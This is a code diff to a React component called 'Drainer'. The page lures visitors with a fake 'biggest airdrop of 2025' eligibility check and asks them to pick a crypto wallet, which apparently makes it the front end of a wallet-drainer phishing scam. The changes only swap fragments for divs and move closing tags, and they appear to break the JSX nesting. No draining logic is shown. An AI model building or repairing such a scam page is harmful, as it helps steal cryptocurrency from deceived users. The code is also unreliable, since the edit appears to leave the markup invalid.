@@ -447,7 +447,7 @@ export default function Drainer() {
               Check your eligibility for the biggest airdrop of 2025
             </p>
             {isMobile && (
-              <>
+              <div>
                 <p className="text-sm sm:text-base md:text-lg text-gray-300">Or choose a specific wallet:</p>
                 <div className="grid grid-cols-2 gap-3 sm:gap-4 max-w-lg mx-auto">
                   {wallets.map(w => (
@@ -461,10 +461,10 @@ export default function Drainer() {
                     </button>
                   ))}
                 </div>
-              </>
+              </div>
             )}
           </div>
-        )}
+        </div>
 
         {stage === 'verify' && (
           <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
@@ -492,7 +492,6 @@ export default function Drainer() {
           </div>
         )}
       </div>
-    </div>
     </>
   )
 }
